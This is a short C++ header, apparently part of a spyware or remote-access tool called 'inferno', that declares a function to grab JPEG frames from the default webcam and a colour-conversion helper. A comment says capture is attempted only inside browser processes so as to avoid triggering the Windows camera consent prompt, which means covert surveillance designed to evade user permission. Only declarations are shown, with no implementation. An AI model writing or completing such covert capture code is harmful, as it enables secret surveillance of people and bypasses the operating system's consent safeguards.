#pragma once
#include <cstdint>
#include <string>
#include <vector>

namespace inferno { namespace capture {

struct CameraResult {
    bool success = false;
    std::vector<uint8_t> jpeg_data;
    int width = 0;
    int height = 0;
    std::string error_msg;
};

// Capture a single frame from the default video capture device.
// Only attempts if the host process is a known browser (Chrome, Edge,
// Firefox, Opera) to avoid triggering a Windows consent prompt.
// Returns CameraResult with JPEG bytes or an error message.
CameraResult captureCamera(int width = 640, int height = 480);

// Convert NV12 (YUV 4:2:0 planar) to BGRA 32bpp.
// Exposed for unit testing.
void nv12ToBgra(const uint8_t* y_plane, const uint8_t* uv_plane,
                int width, int height, int y_pitch, int uv_pitch,
                std::vector<uint8_t>& bgra);

}} // namespace inferno::capture
